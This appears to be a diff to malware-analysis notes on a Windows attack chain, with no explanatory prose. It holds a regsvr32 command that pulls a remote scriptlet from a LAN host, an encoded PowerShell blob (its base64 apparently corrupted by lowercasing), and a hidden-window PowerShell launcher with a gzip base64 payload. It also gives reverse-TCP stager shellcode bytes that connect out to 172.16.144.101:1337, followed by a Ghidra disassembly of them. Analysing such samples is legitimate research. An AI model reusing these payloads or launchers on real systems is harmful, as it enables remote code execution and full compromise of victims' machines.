@@ -15,4 +15,220 @@ regsvr32 /s /n /u /i:\\192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
 
 aqbmacgawwbjag4adabqahqacgbdadoaogbtagkaegblacaalqblaheaiaa0ackaewakagiapqanahaabwb3aguacgbzaggazqbsagwalgblahgazqanah0azqbsahmazqb7acqayga9acqazqbuahyaogb3agkabgbkagkacgaraccaxabzahkacwb3ag8adwa2adqaxabxagkabgbkag8adwbzafaabwb3aguacgbtaggazqbsagwaxab2adealgawafwacabvahcazqbyahmaaablagwabaauaguaeablaccafqa7acqacwa9ae4azqb3ac0atwbiagoazqbjahqaiabtahkacwb0aguabqauaeqaaqbhagcabgbvahmadabpagmacwauafaacgbvagmazqbzahmauwb0ageacgb0aekabgbmag8aowakahmalgbgagkabablae4ayqbtaguapqakagiaowakahmalgbbahiazwb1ag0azqbuahqacwa9accalqbuag8acaagac0adwagaggaaqbkagqazqbuacaalqbjacaajgaoafsacwbjahiaaqbwahqaygbsag8aywbraf0aoga6agmacgblageadablacgakaboaguadwatae8aygbqaguaywb0acaauwb5ahmadablag0algbjae8algbtahqacgblageabqbsaguayqbkaguacgaoae4azqb3ac0atwbiagoazqbjahqaiabtahkacwb0aguabqauaekatwauaemabwbtahaacgblahmacwbpag8abgauaecaegbpahaauwb0ahiazqbhag0akaaoae4azqb3ac0atwbiagoazqbjahqaiabtahkacwb0aguabqauaekatwauae0azqbtag8acgb5afmadabyaguayqbtacgalabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajwanaeganabzaekaqqbqaduaagb0aeyanabdaeeanwbwafcaygbxac8ayqbtaeiaraarag4arqbqaduaraaxageargbaaeyadab4ae0aqwbtadaayqbtae4avgb1agoavgbnae0atqbfaeoaeabmahgavabwaemamwayadiaaqb5ahmaygbxaesadgbdagqarabyagyanwa4ahgamgbhagwangbuageadgayahaataboadqamgbaaguawgayafoababuag4acabtadeabqb3afeamgbwadiarqbnagiaswa4ac8avaa0afeadgbaadyaywbuaegaugb4aggawaa1aeeaswbnafuabqbhagkababbagcaeab2adyaegbjaduakwbjahcarqa3aeiadgaxahoacabgaguarwbqaekarqazafiazqbsadaatabmafuaeqbeadiaywaxae4atgbzagsaaqbfahyarabqahyatgbnagcasabnafuaeaa4aguazqbnagsababpafmaaabiacsarga0afkasgbfaduatwbkacsadgbpafeamgbgadcanabjaggaywavaeyaqgbnahyabgbtaecavgbpahuaeqbxadiargawafmanabraekarwbuadcacgbwaeqarwa2agmatwbgageamaaxag8amqb3afmauaazadaauwa1aguababgaguavgbhahmauab5ageawqb4afoasgbvadcavwbkae8alwblaewarabtaemazwbmafgakwbyadaadwboaduadqbuafmavabsahaasabzafuaeabxaegatabpadaatqbhafgargawafcakwawaecatqbyafgasqbiadeaagbiaeuasgbiahcaugbpahiarqbvafeaeabqahcaaqbraggauabvagsaqqa0aeiacabsageatwbpaduatabjagcadwa3afuavwbnagoaeaa0agwasqbiaekadqblae0arqaxahqavaayaguaegb2adyaugbwagqadgbcaeqarqbuaeqacqbradyasqbsagmaqgblaeyayqa0ahqarqbhadiacqbuahuatgbqaeuazwbjafaasqbbadmargbuag8arwbyahgaaqbbagiazqbuaeoawgbcagiaqgbpahuaaqbgafeasqbfahmawqbvadqavqavae0auwbiagyaawblafkazgb0agqanqbxagsabaawag8azwaxaguarwbsahiarqbbahkawab3ahyavqbeaeoamgbfagsayqbpaheakwbjaheabgbcahcaygbjadgarab5ahoaqqboaeqanwblag4awga2agqadqbyag0acabqaegazgb2ageauqbnagoarqa2ag0aaab6aeuaqga5adyaugbpaecatgbpaeqamqbfaguaaabwaeeazwbtag4asqboaduarwbpadeazwbxahuaaabgaemawgbgag4aegaraemaqwavagmazqbcafgababkacsaygbxaemaywbtadqatqbzageanwaxadmawqbhagsangbdaesaawb6aeeanqbvahmacaa0afcavgbyaheawabmafaangbkag0aagbiagcamabjaewavgbkagcasaaxaheanqarahkavabyag8atwbaahuasqb3agmasqbpahoabqbzag4azgbnagsaeqbsag0arwa4afmacabfafuawqa4ahoargbqagmamabtahoalwbvaeyaygazaesawaavafcamqbsaewaswbiaeiasqboaecamqbjafyazwaxaguauqbsagyabaa3afoanaa2ahaaawbfafeaagbnaekaawbqaecaqgazag4auqbmacsaqwbdaduadwbuahuawabuaecaoaaxadeakwblagoabwbiaekaygbiaesaywbcahcacgbragkazqbcag8acgbnafyadwbtaesawqbfafuaywbsafuaqgbeafqaygbbahmababqaeqadwbnahgavwavahuabqbnag4aagaxae0awqb4ahoaoaazae4anqbbahoarwa3aewaaabxaecatqbradgauwbtahoasqbhag8avablahmaoqbiaeuacabwagkababtaemaaabdagsaegbwaeuamgaxag4avqb5adqaoabwafgaoabxaggaaqboag0arabragcaqgbmaecaoabnaeqacgblafqaeabxahoaegbsafeadqbrag8avwbkadcababvagsavwa0adqayqa4afoaoabvaegabwbvafaamaa2ahcaeaa3afuazqbzagiamwbbadmadqb3afiaeab6ahgawab4adcabqbiaeqanqbtae4anabvagkaeaaraemargbmaduaqgbmagkanabwagmarqbrafkamaa0ahqaqgbeafuababoafqarab2admasaa0adeakwawagoaoqbtafiayqbrafmaeqbuaeuaaaa1aguavqb5adeasabvadkacabyafeazwayaesauwbfahoavgbbadqawqbsaeiaegbpadeangbqafeamqazaeiatqazagwavwbpagiavqbkadyabwa5adcavablag8asgbuagiaqqbuae0adabmafuavgbmageatqbuafcaagbaae0akwbqagiacabsafiasabxahiacaazagiamqbyaesacabsahiawab0ahcaawbwaecaygbkagoatgbuaheamwbiagiargbzadiatabxahqauqa0afyaygbkadqatabjagqazwa1ahyamqawafgasgbwag8azqbaaeqazga4ahcabgbcag0acgayagearwbradeacgb1ahoawabmagiacqazadiacwbnafoayga5afyamwbladiamwavafyatgbladiakwa2afgabgb1ae8atwbhadyamwbyafgacgb2afyauqbmaheadgbuadkacgbeageamqbvaheawab1aeyamgbyaeoakwayaggaoqbxafmavgblag4arwbkafaaagbxadcadaboadkazab0afgauqaraegadwa4afkanwbyahuacqboahkacaavahcasabuagiaagbwagearabjag0aagb1aeqawqbrageaaqb5ahqanwazadmasqbiagoawqbyahaanwbnafoatgbtahaawgbxaheavqayadcacqbjahyauqbyagyamwbradcaegbladgadabkaguasqbragyacaboadgargbqadeayqbwahgadgbhafeadwbqaeeamgbradkadgavafcavwbhagqamgarahiacqbgacsawablahyaaqaradcaqgb6agqavga1afqaeqb4afaabgbzageanqbqafiacgbqagwatqa2agyaugbwae0adgbqaeuawabkafeacabqageaoabsagyabga2agyaaabhagsatwbhaeyauabladkaugbtaecazabtaguanwbiafeavgbaaeqabwbwadeaswb4agmamab2admaawbzagqadgb3afuaqgaxagsaqgbuadyasqbzaeuanqbyac8azgbnafiamgbmahoacgbnagmangb3afgamwbaaemaeabbae4aagbwaesabwbeafqalwbxafeayqb5admarwbhaecaawbnahiavaawagkawabrahuacgb1ac8aywbkahmangbnae8aqgbwaguataa4ag4aeabwafgabwbeafaawgbmafianqbiadcaygbrahuavwa1admavgbgafuaoqa5acsazgb3aheaeqbmagiawabhacsarabragyawgawahyawabuagkadqbeafuarqayahoamwaxafealwavagoabqa1afeazwb3aeoaqqbdag0aygavaekalwbnacsangb0ag8abqbqaguasqbfafoatqbbaesangbjafyangbfaguaaabqahaavwbyahyadaboaeqavabwagsaswbuaeqamwbiahcaaqbvafuaqqbzadmarwb0ahcaoaarafyavqbsag8aeqbgagqadabyagcabwbsaegaraaxafgasgbzacsatwbuadkamaa0agyaaaaxaguavwbyaekamqbsadqargbwafmalwbkagyamqa4adyazqbaag0aqqbqaduaqwbhafeauwbiafkacabzaeuasabsadgabwbwaguamqbwaheauqbragqadgbmafmadabsaemaqwaradmanaarahearwbxaduamwbjaeoamqbzagwatabuac8aqqb5afiasabxacsaeabnafyavqa0aewacabvaemadaayahyakwbmafuamqbhagqaqwavaggaegbmag8amwbuahqanwbwagyanwbqadqavwbkagkavqbsagoazgbxaegaeabladgawaavagcaagbjafaadwa1adcaaqbdagsasabtafeadqbhaemaeqbqaegadqaradiamqa2aeqatgbdahyatabqadcasqbtaecauqbiahoazaa3adaacgbladmakwa0afiazgazae0arqbiahcazabuahaauaa4ahkacgavaecaoabyaemazwbbaeeajwanackakqapacwawwbtahkacwb0aguabqauaekatwauaemabwbtahaacgblahmacwbpag8abgauaemabwbtahaacgblahmacwbpag8abgbnag8azablaf0aoga6aeqazqbjag8abqbwahiazqbzahmakqapackalgbsaguayqbkafqabwbfag4azaaoackakqapaccaowakahmalgbvahmazqbtaggazqbsagwarqb4aguaywb1ahqazqa9acqazgbhagwacwbladsajabzac4augblagqaaqbyaguaywb0afmadabhag4azabhahiazabpahuadabwahuadaa9acqadabyahuazqa7acqacwauafcaaqbuagqabwb3afmadab5agwazqa9accasabpagqazablag4ajwa7acqacwauaemacgblageadablae4abwbxagkabgbkag8adwa9acqadabyahuazqa7acqacaa9afsauwb5ahmadablag0algbeagkayqbnag4abwbzahqaaqbjahmalgbqahiabwbjaguacwbzaf0aoga6afmadabhahiadaaoacqacwapadsa
 
+
+New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String
+
+[Byte[]]$nv = [System.Convert]::FromBase64String
+
 H4sIAP5jtF4CA7VWbW/aSBD+nEj5D1aFZFtxMCS0aSNVujVgMMEJxLxTVC322iysbWKvCdDrf78x2Gl6Tav2pLN42ZeZ2Zlnnpm1mwQ2p2EgbK8/T4QvZ6cnHRxhX5AKMUmGilAgxv6zI5+cwE7Bv1zpFeGjIE3Rel0LfUyD2c1NNYkiEvDjvNggHMUx8eeMkliShb+F4YJE5OJ+viQ2F74Ihc/FBgvnmGViuyq2F0S4QIGT7rVDG6cOFa01o1wSP30S5elFeVasPyaYxZJo7WJO/KLDmCgLX+X0wN5uTSTRpHYUxqHLi0MaXF0W+0GMXXIH1jbEJHwROrEoQxjwiQhPokA4BpRaOO5LIgw7UWgjx4lIHIuKME1tT2ezv6RpdvBDEnDqk6IRcBKFa4tEG2qTuNjEgcPIA3FnoGXxiAbeTJZBbBOuiFQIEsYU4U/MSHfkKYftd5Wkl0og1eGRrEAyXwvUDJ2EkaOq+IqnBwbI8DyzAND7enZ6durmpPHfvaQMjE6mhzEB96ROGNOD1EehpAgmnIN5GO1gWuhFCZFnz+CC/ceBXlJ+bqCcS4Msa713YGk6CKkzA5Usp4WVrqXLP6dmjbg0ILVdgH1q5+yTXoOZuIwcIizmYnfgkyRmG8SpEUY8zFPc0mz/oFb3KX/W1RLKHBIhG1IVg1eQRfl7Z46pkEQjMIkPGB3nQL+CC5wnuXTG811+ejoHIbHKcBwrQieBorMVwSKYEUcRUBDTbAslPDwMxW/umgnj1MYxz83N5AzG7LhqGMQ8SmzIGoTes9bEppilSChCkzpE21nUy48VX8WhihmDQgBLG8gDrKTxWzzlQuQoWd7lokW44a8Z8UHoUP06wx7Uesb3A3uwRxzxXx7mbD5SN4Uix+CFf5Bfi4VcEQY04tBDUlhTDv3H41+0j9SRakSyTEh5eUy1HU9pXQg2KSEzVA4YRBzi16PQ13BM3lWObUJ6o97TKoJnbATMtLUVLaMnWjZM+PbplRHWrp3b1rKpRrXtwkVGbJjNTq3bbFY2LWtQ4Vbd4Lcdg5v10XJpoeZDf8wnBmr2aGk1ruzXLbq32sgZb9V3e23/VNK2+6XnuOOa63rXrvVQfqvT9rDa1UqXuF2rJ+2h9qSVKnGdPjW7tN9dtXQ+Hw8Y7ruqNyp/wHTbjpaDcmjuDYQaiyt733IHjYXp7MZNSpZqqU27qIvQrf3Q7ze8tdeIkfph8Fj1aVxvaQwjA2k9v/WWad2+rqF+Xevi+7BzdV5TyxPnsa5PRrjlM6fRVMvjEXJQpPa8Rfn6fhGkOGFPe9RSGdSe7HQVZDoV1Kxc0v3ksdvwUB1kBn6IsE5X/fMR2Lzrgc6wX3ZCxANjpKoDT/WQay3GGGkgrT0iXQuru/cds6MOBpeL8nxVXoDPZLR5b7bQuW53VFU99+fwqyLbXG+DkfZ0vXniuDUE2z31Q//jm5QgwJACmb/I/M+6tomjeIEZMAK6cV6EehjpWXvthDTVkKTD3bwiUUAY3Gtw8+VURoyFdtrgoRHD1XJs+On904fh1eWrI1l4FpS/df186eZmAj5CaQSbYpsEHl8ope1VqQQdvLStlCC+34+qGq53cJ1slLT/AyRHq+xgVU4LpUCt2v+LU1adC/hzfo3Tt7Vf7P4WdiUljfWHxe8X/gjIPw57iCkHSQuaCyPHu+216DNCvLj7ISGQbzd70re3+4Rf3MEbwdnpP8yr/G8rCgAA
+
+
+
+
+fc e8 82 00 00 00 60 89 e5 31 c0 64 8b 50 30 8b 52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f2 52 57 8b 52 10 8b 4a 3c 8b 4c 11 78 e3 48 01 d1 51 8b 59 20 01 d3 8b 49 18 e3 3a 49 8b 34 8b 01 d6 31 ff ac c1 cf 0d 01 c7 38 e0 75 f6 03 7d f8 3b 7d 24 75 e4 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 5f 5f 5a 8b 12 eb 8d 5d 68 33 32 00 00 68 77 73 32 5f 54 68 4c 77 26 07 89 e8 ff d0 b8 90 01 00 00 29 c4 54 50 68 29 80 6b 00 ff d5 6a 0a 68 ac 10 90 65 68 02 00 05 39 89 e6 50 50 50 50 40 50 40 50 68 ea 0f df e0 ff d5 97 6a 10 56 57 68 99 a5 74 61 ff d5 85 c0 74 0a ff 4e 08 75 ec e8 67 00 00 00 6a 00 6a 04 56 57 68 02 d9 c8 5f ff d5 83 f8 00 7e 36 8b 36 6a 40 68 00 10 00 00 56 6a 00 68 58 a4 53 e5 ff d5 93 53 6a 00 56 53 57 68 02 d9 c8 5f ff d5 83 f8 00 7d 28 58 68 00 40 00 00 6a 00 50 68 0b 2f 0f 30 ff d5 57 68 75 6e 4d 61 ff d5 5e 5e ff 0c 24 0f 85 70 ff ff ff e9 9b ff ff ff 01 c3 29 c6 75 c1 c3 bb f0 b5 a2 56 6a 00 53 ff d5
+
+                             //
+                             // ram 
+                             // ram: 00000000-00000154
+                             //
+             assume DF = 0x0  (Default)
+        00000000 fc              CLD
+        00000001 e8 82 00        CALL       FUN_00000088                                     undefined FUN_00000088()
+                 00 00
+        00000006 60              PUSHAD
+        00000007 89 e5           MOV        EBP,ESP
+        00000009 31 c0           XOR        EAX,EAX
+        0000000b 64 8b 50 30     MOV        EDX,dword ptr FS:[EAX + 0x30]
+        0000000f 8b 52 0c        MOV        EDX,dword ptr [EDX + 0xc]
+        00000012 8b 52 14        MOV        EDX,dword ptr [EDX + 0x14]
+                             LAB_00000015                                    XREF[1]:     00000086(j)  
+        00000015 8b 72 28        MOV        ESI,dword ptr [EDX + 0x28]
+        00000018 0f b7 4a 26     MOVZX      ECX,word ptr [EDX + 0x26]
+        0000001c 31 ff           XOR        EDI,EDI
+                             LAB_0000001e                                    XREF[1]:     0000002a(j)  
+        0000001e ac              LODSB      ESI
+        0000001f 3c 61           CMP        AL,0x61
+        00000021 7c 02           JL         LAB_00000025
+        00000023 2c 20           SUB        AL,0x20
+                             LAB_00000025                                    XREF[1]:     00000021(j)  
+        00000025 c1 cf 0d        ROR        EDI,0xd
+        00000028 01 c7           ADD        EDI,EAX
+        0000002a e2 f2           LOOP       LAB_0000001e
+        0000002c 52              PUSH       EDX
+        0000002d 57              PUSH       EDI
+        0000002e 8b 52 10        MOV        EDX,dword ptr [EDX + 0x10]
+        00000031 8b 4a 3c        MOV        ECX,dword ptr [EDX + 0x3c]
+        00000034 8b 4c 11 78     MOV        ECX,dword ptr [ECX + EDX*0x1 + 0x78]
+        00000038 e3 48           JECXZ      LAB_00000082
+        0000003a 01 d1           ADD        ECX,EDX
+        0000003c 51              PUSH       ECX
+        0000003d 8b 59 20        MOV        EBX,dword ptr [ECX + 0x20]
+        00000040 01 d3           ADD        EBX,EDX
+        00000042 8b 49 18        MOV        ECX,dword ptr [ECX + 0x18]
+                             LAB_00000045                                    XREF[1]:     0000005f(j)  
+        00000045 e3 3a           JECXZ      LAB_00000081
+        00000047 49              DEC        ECX
+        00000048 8b 34 8b        MOV        ESI,dword ptr [EBX + ECX*0x4]
+        0000004b 01 d6           ADD        ESI,EDX
+        0000004d 31 ff           XOR        EDI,EDI
+                             LAB_0000004f                                    XREF[1]:     00000057(j)  
+        0000004f ac              LODSB      ESI
+        00000050 c1 cf 0d        ROR        EDI,0xd
+        00000053 01 c7           ADD        EDI,EAX
+        00000055 38 e0           CMP        AL,AH
+        00000057 75 f6           JNZ        LAB_0000004f
+        00000059 03 7d f8        ADD        EDI,dword ptr [EBP + -0x8]
+        0000005c 3b 7d 24        CMP        EDI,dword ptr [EBP + 0x24]
+        0000005f 75 e4           JNZ        LAB_00000045
+        00000061 58              POP        EAX
+        00000062 8b 58 24        MOV        EBX,dword ptr [EAX + 0x24]
+        00000065 01 d3           ADD        EBX,EDX
+        00000067 66 8b 0c 4b     MOV        CX,word ptr [EBX + ECX*0x2]
+        0000006b 8b 58 1c        MOV        EBX,dword ptr [EAX + 0x1c]
+        0000006e 01 d3           ADD        EBX,EDX
+        00000070 8b 04 8b        MOV        EAX,dword ptr [EBX + ECX*0x4]
+        00000073 01 d0           ADD        EAX,EDX
+        00000075 89 44 24 24     MOV        dword ptr [ESP + 0x24],EAX
+        00000079 5b              POP        EBX
+        0000007a 5b              POP        EBX
+        0000007b 61              POPAD
+        0000007c 59              POP        ECX
+        0000007d 5a              POP        EDX
+        0000007e 51              PUSH       ECX
+        0000007f ff e0           JMP        EAX
+                             LAB_00000081                                    XREF[1]:     00000045(j)  
+        00000081 5f              POP        EDI
+                             LAB_00000082                                    XREF[1]:     00000038(j)  
+        00000082 5f              POP        EDI
+        00000083 5a              POP        EDX
+        00000084 8b 12           MOV        EDX,dword ptr [EDX]
+        00000086 eb 8d           JMP        LAB_00000015
+                             **************************************************************
+                             *                          FUNCTION                          *
+                             **************************************************************
+                             undefined FUN_00000088()
+             undefined         AL:1           <RETURN>
+             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     00000093(*)  
+             undefined4        Stack[-0x1a0   local_1a0                               XREF[1]:     000000a4(*)  
+             undefined4        Stack[-0x1ac   local_1ac                               XREF[1]:     000000da(RW)  
+             undefined4        Stack[-0x1b4   local_1b4                               XREF[1]:     000000f6(*)  
+             undefined4        Stack[-0x1f4   local_1f4                               XREF[1]:     00000136(*)  
+                             FUN_00000088                                    XREF[1]:     00000001(c)  
+        00000088 5d              POP        EBP
+        00000089 68 33 32        PUSH       0x3233
+                 00 00
+        0000008e 68 77 73        PUSH       0x5f327377
+                 32 5f
+        00000093 54              PUSH       ESP=>local_8
+        00000094 68 4c 77        PUSH       0x726774c
+                 26 07
+        00000099 89 e8           MOV        EAX,EBP
+        0000009b ff d0           CALL       EAX
+        0000009d b8 90 01        MOV        EAX,0x190
+                 00 00
+        000000a2 29 c4           SUB        ESP,EAX
+        000000a4 54              PUSH       ESP=>local_1a0
+        000000a5 50              PUSH       EAX
+        000000a6 68 29 80        PUSH       0x6b8029
+                 6b 00
+        000000ab ff d5           CALL       EBP
+        000000ad 6a 0a           PUSH       0xa
+                             LAB_000000af                                    XREF[1]:     00000139(j)  
+        000000af 68 ac 10        PUSH       0x659010ac
+                 90 65
+        000000b4 68 02 00        PUSH       0x39050002
+                 05 39
+        000000b9 89 e6           MOV        ESI,ESP
+        000000bb 50              PUSH       EAX
+        000000bc 50              PUSH       EAX
+        000000bd 50              PUSH       EAX
+        000000be 50              PUSH       EAX
+        000000bf 40              INC        EAX
+        000000c0 50              PUSH       EAX
+        000000c1 40              INC        EAX
+        000000c2 50              PUSH       EAX
+        000000c3 68 ea 0f        PUSH       0xe0df0fea
+                 df e0
+        000000c8 ff d5           CALL       EBP
+        000000ca 97              XCHG       EAX,EDI
+                             LAB_000000cb                                    XREF[1]:     000000dd(j)  
+        000000cb 6a 10           PUSH       0x10
+        000000cd 56              PUSH       ESI
+        000000ce 57              PUSH       EDI
+        000000cf 68 99 a5        PUSH       0x6174a599
+                 74 61
+        000000d4 ff d5           CALL       EBP
+        000000d6 85 c0           TEST       EAX,EAX
+        000000d8 74 0a           JZ         LAB_000000e4
+        000000da ff 4e 08        DEC        dword ptr [ESI + local_1ac]
+        000000dd 75 ec           JNZ        LAB_000000cb
+                             LAB_000000df                                    XREF[1]:     0000013f(j)  
+        000000df e8 67 00        CALL       FUN_0000014b                                     undefined FUN_0000014b()
+                 00 00
+                             LAB_000000e4                                    XREF[1]:     000000d8(j)  
+        000000e4 6a 00           PUSH       0x0
+        000000e6 6a 04           PUSH       0x4
+        000000e8 56              PUSH       ESI
+        000000e9 57              PUSH       EDI
+        000000ea 68 02 d9        PUSH       0x5fc8d902
+                 c8 5f
+        000000ef ff d5           CALL       EBP
+        000000f1 83 f8 00        CMP        EAX,0x0
+        000000f4 7e 36           JLE        LAB_0000012c
+        000000f6 8b 36           MOV        ESI=>local_1b4,dword ptr [ESI]
+        000000f8 6a 40           PUSH       0x40
+        000000fa 68 00 10        PUSH       0x1000
+                 00 00
+        000000ff 56              PUSH       ESI
+        00000100 6a 00           PUSH       0x0
+        00000102 68 58 a4        PUSH       0xe553a458
+                 53 e5
+        00000107 ff d5           CALL       EBP
+        00000109 93              XCHG       EAX,EBX
+        0000010a 53              PUSH       EBX
+                             LAB_0000010b                                    XREF[1]:     00000148(j)  
+        0000010b 6a 00           PUSH       0x0
+        0000010d 56              PUSH       ESI
+        0000010e 53              PUSH       EBX
+        0000010f 57              PUSH       EDI
+        00000110 68 02 d9        PUSH       0x5fc8d902
+                 c8 5f
+        00000115 ff d5           CALL       EBP
+        00000117 83 f8 00        CMP        EAX,0x0
+        0000011a 7d 28           JGE        LAB_00000144
+        0000011c 58              POP        EAX
+        0000011d 68 00 40        PUSH       0x4000
+                 00 00
+        00000122 6a 00           PUSH       0x0
+        00000124 50              PUSH       EAX
+        00000125 68 0b 2f        PUSH       0x300f2f0b
+                 0f 30
+        0000012a ff d5           CALL       EBP
+                             LAB_0000012c                                    XREF[1]:     000000f4(j)  
+        0000012c 57              PUSH       EDI
+        0000012d 68 75 6e        PUSH       0x614d6e75
+                 4d 61
+        00000132 ff d5           CALL       EBP
+        00000134 5e              POP        ESI
+        00000135 5e              POP        ESI
+        00000136 ff 0c 24        DEC        dword ptr [ESP]=>local_1f4
+        00000139 0f 85 70        JNZ        LAB_000000af
+                 ff ff ff
+        0000013f e9 9b ff        JMP        LAB_000000df
+                 ff ff
+                             LAB_00000144                                    XREF[1]:     0000011a(j)  
+        00000144 01 c3           ADD        EBX,EAX
+        00000146 29 c6           SUB        ESI,EAX
+        00000148 75 c1           JNZ        LAB_0000010b
+        0000014a c3              RET
+                             **************************************************************
+                             *                          FUNCTION                          *
+                             **************************************************************
+                             undefined FUN_0000014b()
+             undefined         AL:1           <RETURN>
+                             FUN_0000014b                                    XREF[1]:     FUN_00000088:000000df(c)  
+        0000014b bb f0 b5        MOV        EBX,0x56a2b5f0
+                 a2 56
+        00000150 6a 00           PUSH       0x0
+        00000152 53              PUSH       EBX
+        00000153 ff d5           CALL       EBP
